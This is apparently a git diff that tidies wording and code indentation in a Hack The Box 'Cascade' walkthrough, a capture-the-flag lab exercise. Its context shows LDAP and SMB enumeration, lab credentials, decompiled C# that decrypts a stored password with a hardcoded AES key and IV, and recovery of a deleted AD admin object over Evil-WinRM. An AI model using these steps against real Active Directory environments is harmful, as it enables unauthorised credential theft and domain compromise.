@@ -65,7 +65,7 @@ Anonymous login successful
 SMB1 disabled -- no workgroup available
 ```
 
-#### LDAP Enumeration (For namingcontexts):
+#### LDAP Enumeration (For naming contexts):
 ```shell
 root@kali:~# ldapsearch -h 10.10.10.182 -x -s base namingcontexts
 # extended LDIF
@@ -92,7 +92,7 @@ result: 0 Success
 # numEntries: 1
 ```
 
-### LDAP Enumeration:
+#### LDAP Enumeration:
 ```shell
 root@kali:~# ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local"
 # extended LDIF
@@ -516,7 +516,7 @@ whenCreated                        : 1/9/2020 6:08:13 PM
 ```
 
 Since we got a new user, try to enumerate the SMB shares again.<br>
-We can find that now we can read access to `Audit$` previously we didn't have any access.
+We can find that now we have read access to `Audit$` previously we didn't have any access.
 ```shell
 root@kali:~# smbmap -H 10.10.10.182 -u s.smith -p sT333ve2
 [+] IP: 10.10.10.182:445	Name: 10.10.10.182                                      
@@ -613,7 +613,7 @@ root@kali:~# file 10.10.10.182-Audit_DB_Audit.db
 ```
 
 To take a look at the `Audit.db`, run `sqlite3` command.<br>
-There is a "password" for user `ArkSvc`.
+There is a base64 "password" for user `ArkSvc`.
 ```shell
 root@kali:~# sqlite3 10.10.10.182-Audit_DB_Audit.db 
 SQLite version 3.32.3 2020-06-18 14:00:33
@@ -653,6 +653,7 @@ Then, go this way to find the Main() function of `CascAudit.exe`.
 2. `CascAudit.exe`
 3. `{} CascAudiot`
 4. `MainModule`
+
 ![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-29/2020-07-28-22-15-05.png)
 
 #### Source Code:
@@ -790,27 +791,27 @@ namespace CascAudiot
 Following is the important section.<br>
 It is getting the encrypted password from SQLite database and decrypting with the key `c4scadek3y654321`.
 ```shell
-					sqliteConnection.Open();
-						using (SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT * FROM LDAP", sqliteConnection))
-						{
-							using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
-							{
-								sqliteDataReader.Read();
-								str = Conversions.ToString(sqliteDataReader["Uname"]);
-								str2 = Conversions.ToString(sqliteDataReader["Domain"]);
-								string text = Conversions.ToString(sqliteDataReader["Pwd"]);
-								try
-								{
-									password = Crypto.DecryptString(text, "c4scadek3y654321");
-								}
-								catch (Exception ex)
-								{
-									Console.WriteLine("Error decrypting password: " + ex.Message);
-									return;
-								}
-							}
-						}
-						sqliteConnection.Close();
+sqliteConnection.Open();
+using (SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT * FROM LDAP", sqliteConnection))
+{
+	using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
+	{
+		sqliteDataReader.Read();
+		str = Conversions.ToString(sqliteDataReader["Uname"]);
+		str2 = Conversions.ToString(sqliteDataReader["Domain"]);
+		string text = Conversions.ToString(sqliteDataReader["Pwd"]);
+		try
+		{
+			password = Crypto.DecryptString(text, "c4scadek3y654321");
+		}
+		catch (Exception ex)
+		{
+			Console.WriteLine("Error decrypting password: " + ex.Message);
+			return;
+		}
+	}
+}
+sqliteConnection.Close();
 ```
 
 However, `CascAudit.exe` does not have the definition of `Crypto.DecryptString()`.<br>
@@ -818,26 +819,26 @@ Then, take a look at `CascCrypto.dll`. We can find the function defined.
 ![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-29/2020-07-28-22-16-53.png)
 ```shell
 public static string DecryptString(string EncryptedString, string Key)
+{
+	byte[] array = Convert.FromBase64String(EncryptedString);
+	Aes aes = Aes.Create();
+	aes.KeySize = 128;
+	aes.BlockSize = 128;
+	aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
+	aes.Mode = 1;
+	aes.Key = Encoding.UTF8.GetBytes(Key);
+	string @string;
+	using (MemoryStream memoryStream = new MemoryStream(array))
+	{
+		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), 0))
 		{
-			byte[] array = Convert.FromBase64String(EncryptedString);
-			Aes aes = Aes.Create();
-			aes.KeySize = 128;
-			aes.BlockSize = 128;
-			aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
-			aes.Mode = 1;
-			aes.Key = Encoding.UTF8.GetBytes(Key);
-			string @string;
-			using (MemoryStream memoryStream = new MemoryStream(array))
-			{
-				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), 0))
-				{
-					byte[] array2 = new byte[checked(array.Length - 1 + 1)];
-					cryptoStream.Read(array2, 0, array2.Length);
-					@string = Encoding.UTF8.GetString(array2);
-				}
-			}
-			return @string;
+			byte[] array2 = new byte[checked(array.Length - 1 + 1)];
+			cryptoStream.Read(array2, 0, array2.Length);
+			@string = Encoding.UTF8.GetString(array2);
 		}
+	}
+	return @string;
+}
 ```
 
 To get the password to log in, we have to write the following .NET code.<br>
@@ -923,7 +924,7 @@ Global Group memberships     *Domain Users
 The command completed successfully.
 ```
 
-`Get-ADobject` has an option `-includeDeletedObjects` for the deleted AD objects.<br>
+`Get-ADobject` has an option `-includeDeletedObjects` to search for the deleted AD objects.<br>
 Add `-and name -ne "Deleted Objects"` to remove "Deleted Objects" container that keeps objects that have `isDeleted` attribute.<br>
 ```shell
 *Evil-WinRM* PS C:\Users\arksvc\Documents> get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
@@ -982,7 +983,7 @@ ObjectClass       : user
 ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
 ```
 
-With the following command, we can view the deleted object `TempAdmin` with GUID `f0cc344d-31e0-4866-bceb-a842791ca059`.
+With the following command, we can view the attributes of a deleted object `TempAdmin` with GUID `f0cc344d-31e0-4866-bceb-a842791ca059`.
 ```shell
 *Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -Identity f0cc344d-31e0-4866-bceb-a842791ca059 -includeDeletedObjects -Properties *
 
@@ -1065,4 +1066,3 @@ As usual, `root.txt` is in the directory `C:\Users\Administrator\Desktop`.
 
 ## 4. References
 * [Active Directory Object Recovery (or Recycle Bin)](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/)
-* 
